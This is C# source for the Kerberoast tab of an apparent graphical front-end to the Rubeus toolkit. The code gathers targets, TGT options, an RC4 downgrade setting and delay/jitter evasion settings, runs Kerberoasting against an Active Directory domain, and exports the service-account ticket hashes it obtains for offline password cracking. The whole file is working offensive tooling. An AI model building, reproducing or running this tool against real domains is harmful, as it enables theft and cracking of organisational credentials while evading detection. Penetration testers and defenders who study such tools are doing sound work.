using Rubeus.Domain;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace RubeusGui.Windows.Tabs
{

    public partial class KerberoastTab : RubeusTab

    {

        public KerberoastTab()
        {
            InitializeComponent();
        }

        private void RubeusTab_Loaded(object sender, RoutedEventArgs e)
        {
            if (this.ExpandAdvancedOptions)
            {
                ExpAdvanced.IsExpanded = true;
            }
        }

        private void LnkHideDescription_Click(object sender, RoutedEventArgs e)
        {
            ToggleDescriptionVisibility(LblDescription,LnkHideDescription);
        }

        private void RdoKerberoastSpecificUser_Checked(object sender, RoutedEventArgs e)
        {
            // We could do this in XAML but then setting focus doesn't work
            TxtKerberosSpecificUsername.IsEnabled = true;
            TxtKerberosSpecificUsername.Focus();
        }

        private void RdoKerberoastSpecificSpn_Checked(object sender, RoutedEventArgs e)
        {
            // We could do this in XAML but then setting focus doesn't work
            TxtKerberosSpecificSpnName.IsEnabled = true;
            TxtKerberosSpecificSpnName.Focus();
        }

        private void RdoKerberoastSpecificSpn_Unchecked(object sender, RoutedEventArgs e)
        {
            TxtKerberosSpecificSpnName.IsEnabled = false;
        }

        private void RdoKerberoastSpecificUser_Unchecked(object sender, RoutedEventArgs e)
        {
            TxtKerberosSpecificUsername.IsEnabled = false;
        }

        private void BtnTgtBrowse_Click(object sender, RoutedEventArgs e)
        {
            var ofd = new Microsoft.Win32.OpenFileDialog();
            ofd.Filter = "Kirbi Files (*.kirbi)|*.kirbi|All Files|*.*";
            if ((bool)ofd.ShowDialog())
            {
                TxtTgtPath.Text = ofd.FileName;
            }
        }

        private void ChkRc4opsec_Checked(object sender, RoutedEventArgs e)
        {
            RdoTgtDeleg.IsChecked = true;
            ChkAes.IsChecked = false;
            PanelTgt.IsEnabled = false;
            ChkAes.IsEnabled = false;
        }

        private void ChkRc4opsec_Unchecked(object sender, RoutedEventArgs e)
        {
            PanelTgt.IsEnabled = true;
            ChkAes.IsEnabled = true;
        }

        private void BtnExecute_Click(object sender, RoutedEventArgs e)
        {
            // Get global domain settings from main window

            KerberoastSettings settings = new KerberoastSettings();
            try
            {
                settings.Domain = OwnerWindow.GetDomainSettings();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Invalid Domain Settings", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // Collect and validate settings user specified in this tab

            try
            {
                if ((bool)RdoKerberoastSpecificUser.IsChecked)
                {
                    if (string.IsNullOrEmpty(TxtKerberosSpecificUsername.Text))
                    {
                        MessageBox.Show("Please specify a username or select another target option", "No Username Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }
                    settings.Username = TxtKerberosSpecificUsername.Text;
                }
                if ((bool)RdoKerberoastSpecificSpn.IsChecked)
                {
                    if (string.IsNullOrEmpty(TxtKerberosSpecificSpnName.Text))
                    {
                        MessageBox.Show("Please specify at least one SPN or select another target option", "No SPN Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }
                    settings.Spns.AddRange(TxtKerberosSpecificSpnName.Text.Split(','));
                }
                if ((bool)ChkStatsOnly.IsChecked) { settings.NoTgsRequests = true; }
                if (!string.IsNullOrWhiteSpace(TxtLdapFilter.Text)) { settings.LdapFilter = TxtLdapFilter.Text; }
                if ((bool)ChkRc4opsec.IsChecked)
                {
                    settings.EncryptionMode = KerberoastSettings.ETypeMode.Rc4Opsec;
                }
                else
                {
                    if ((bool)ChkAes.IsChecked) { settings.EncryptionMode = KerberoastSettings.ETypeMode.Aes; }
                    if ((bool)RdoTgtDeleg.IsChecked)
                    {
                        settings.UseTgtDelegationTrick = true;
                    }
                    else if ((bool)RdoTgtFromFile.IsChecked)
                    {
                        if (string.IsNullOrEmpty(TxtTgtPath.Text))
                        {
                            MessageBox.Show("Please specify the path to your TGT file or select another TGT option", "No TGT Path Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                            return;
                        }
                        try
                        {
                            settings.Tgt = new Rubeus.KRB_CRED(System.IO.File.ReadAllBytes(TxtTgtPath.Text));
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("Error reading TGT from file KIRBI file: " + ex.Message, "TGT File Error", MessageBoxButton.OK, MessageBoxImage.Error);
                            return;
                        }
                    }
                    else if ((bool)RdoTgtBase64.IsChecked)
                    {
                        if (string.IsNullOrEmpty(TxtTgtBase64.Text))
                        {
                            MessageBox.Show("Please enter the base64 representation of a TGT or select another TGT option", "No TGT Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                            return;
                        }
                        byte[] kirbiBytes = Convert.FromBase64String(TxtTgtBase64.Text);
                        settings.Tgt = new Rubeus.KRB_CRED(kirbiBytes);
                    }
                }

                // Still collecting settings user specified in this tab

                if ((bool)ChkDelay.IsChecked)
                {
                    int delay;
                    if (!int.TryParse(TxtDelay.Text, out delay) || delay < 0)
                    {
                        MessageBox.Show("Please specify a valid timespan in milliseconds that should be used to wait between network requests", "Invalid Time Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }
                    int jitter;
                    if (!int.TryParse(TxtJitter.Text, out jitter) || jitter < 0 || jitter > 100)
                    {
                        MessageBox.Show("Please specify a valid percentage between 0 and 100 that should be used to randomize the delay", "Invalid Jitter Specified", MessageBoxButton.OK, MessageBoxImage.Warning);
                        return;
                    }
                    settings.Delay = delay;
                    settings.Jitter = jitter;
                }
                if ((bool)ChkLimitResults.IsChecked) { settings.ResultsLimit = Convert.ToInt32(TxtResultsLimit.Text); }
                if ((bool)RdoEnterprise.IsChecked) { settings.Enterprise = true; }
                if ((bool)RdoAutoEnterprise.IsChecked) { settings.AutoEnterprise = true; }

                // Show progress UI and start new thread to execute kerberoasting

                LblExecuteBtn.Text = "Running...";
                ImgExecuteBtn.Source = new BitmapImage(UiHelpers.HourglassIconPath);
                BtnExecute.IsEnabled = false;
                ProgBar.Visibility = Visibility.Visible;
                this.IsEnabled = false;

                System.Threading.Thread bgThread = new System.Threading.Thread(() => RunKerberoast(settings));
                bgThread.IsBackground = true;
                bgThread.Start();
            }
            catch (Exception ex)
            {
                ExecuteFinished(new List<KerberoastResult>(), "Error preparing to run Kerberoasting: " + ex.Message);
            }
        }

        // Executed on background thread
        private void RunKerberoast(KerberoastSettings settings)
        {
            List<KerberoastResult> results = new List<KerberoastResult>();
            string errorMessage = string.Empty;
            try
            {
                results = Rubeus.Roast.Kerberoast(settings);
            }
            catch (Exception ex)
            {
                errorMessage = ex.Message;
            }
            // Switch back to UI thread and call ExecuteFinished method, passing it the results to be displayed
            this.Dispatcher.Invoke(new Action<List<KerberoastResult>, string>(ExecuteFinished), results, errorMessage);
        }

        private void ExecuteFinished(List<KerberoastResult> results, string errorMessage)
        {
            // This check avoids null references if program was closed and thread has not terminated (shouldn't happen as we set Thread.IsBackground to true, but better safe than sorry)
            if (this.OwnerWindow.IsLoaded)
            {
                this.IsEnabled = true;
                LsvResults.IsEnabled = true;
                LblResults.IsEnabled = true;    
                PnlExport.IsEnabled = true;
                LsvResults.ItemsSource = results;
                LblResults.Text = "Results (" + results?.Count + " users found):";
                LblExecuteBtn.Text = "Run";
                ImgExecuteBtn.Source = new BitmapImage(UiHelpers.PlayIconPath);
                BtnExecute.IsEnabled = true;
                ProgBar.Visibility = Visibility.Collapsed;
                if (!string.IsNullOrEmpty(errorMessage))
                {
                    MessageBox.Show(errorMessage, "Error Executing Kerberoast", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void CtxResultsListView_Opened(object sender, RoutedEventArgs e)
        {
            CtxItemCopyHash.IsEnabled = LsvResults.SelectedItem != null;
            CtxItemCopySpn.IsEnabled = LsvResults.SelectedItem != null;
            CtxItemCopyUsername.IsEnabled = LsvResults.SelectedItem != null;
            CtxItemCopyDn.IsEnabled = LsvResults.SelectedItem != null;
        }

        private void CtxItemCopyHash_Click(object sender, RoutedEventArgs e)
        {
            UiHelpers.CopyToClipboard(((KerberoastResult)LsvResults.SelectedItem)?.HashData?.Hash);
        }

        private void CtxItemCopyUsername_Click(object sender, RoutedEventArgs e)
        {
            UiHelpers.CopyToClipboard(((KerberoastResult)LsvResults.SelectedItem)?.Username);
        }

        private void CtxItemCopyDn_Click(object sender, RoutedEventArgs e)
        {
            UiHelpers.CopyToClipboard(((KerberoastResult)LsvResults.SelectedItem)?.DistinguishedName);
        }

        private void CtxItemCopySpn_Click(object sender, RoutedEventArgs e)
        {
            UiHelpers.CopyToClipboard(((KerberoastResult)LsvResults.SelectedItem)?.ServicePrincipalName);
        }

        private void CtxItemExportHashes_Click(object sender, RoutedEventArgs e)
        {
            ExportHashes();
        }

        private void CtxItemExportAll_Click(object sender, RoutedEventArgs e)
        {
            ExportResults();
        }

        private void BtnExportHashes_Click(object sender, RoutedEventArgs e)
        {
            ExportHashes();
        }

        private void BtnExportAll_Click(object sender, RoutedEventArgs e)
        {
            ExportResults();
        }

        private void ExportResults()
        {
            try
            {
                if (LsvResults.ItemsSource != null && LsvResults.Items.Count != 0)
                {
                    var sfd = new Microsoft.Win32.SaveFileDialog();
                    sfd.Filter = "CSV Files (*.csv)|*.csv";
                    sfd.FileName = "KerberoastResults.csv";
                    if ((bool)sfd.ShowDialog())
                    {
                        using (StreamWriter writer = new StreamWriter(sfd.FileName, false, new UTF8Encoding(false)))
                        {
                            writer.WriteLine("\"Username\",\"Hash\",\"Hash Encrypted With\",\"Supported Encryptions\",\"SPN\",\"Distinguished Name\",\"Password Last Set\"");
                            foreach (KerberoastResult result in LsvResults.ItemsSource)
                            {
                                string username = UiHelpers.MakeCsvSafe(result.Username);
                                string hash = result.HashData?.Hash; hash = UiHelpers.MakeCsvSafe(hash);
                                string hashEnc = result.HashData?.EncryptionString; hashEnc = UiHelpers.MakeCsvSafe(hashEnc);
                                string supportedEnc = UiHelpers.MakeCsvSafe(result.SupportedEncryptionString);
                                string spn = UiHelpers.MakeCsvSafe(result.ServicePrincipalName);
                                string dn = UiHelpers.MakeCsvSafe(result.DistinguishedName);
                                string pwdLastSet = result.PasswordLastSet?.ToString(); pwdLastSet = UiHelpers.MakeCsvSafe(pwdLastSet);
                                writer.WriteLine($"{username},{hash},{hashEnc},{supportedEnc},{spn},{dn},{pwdLastSet}");
                            }
                        }
                        MessageBox.Show("Hashes exported to file successfully", "File Saved Successfully", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error saving results to file: " + ex.Message, "Error Exporting Results", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void ExportHashes()
        {
            try
            {
                if (LsvResults.ItemsSource != null)
                {
                    var sfd = new Microsoft.Win32.SaveFileDialog();
                    sfd.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
                    sfd.FileName = "hashes.txt";
                    if ((bool)sfd.ShowDialog())
                    {
                        using (StreamWriter writer = new StreamWriter(sfd.FileName, false, new UTF8Encoding(false)))
                        {
                            foreach (KerberoastResult result in LsvResults.ItemsSource)
                            {
                                writer.WriteLine(result.HashData?.Hash);
                            }
                        }
                        MessageBox.Show("Hashes exported to file successfully", "File Saved Successfully", MessageBoxButton.OK, MessageBoxImage.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error saving results to file: " + ex.Message, "Error Exporting Results", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

    }
}
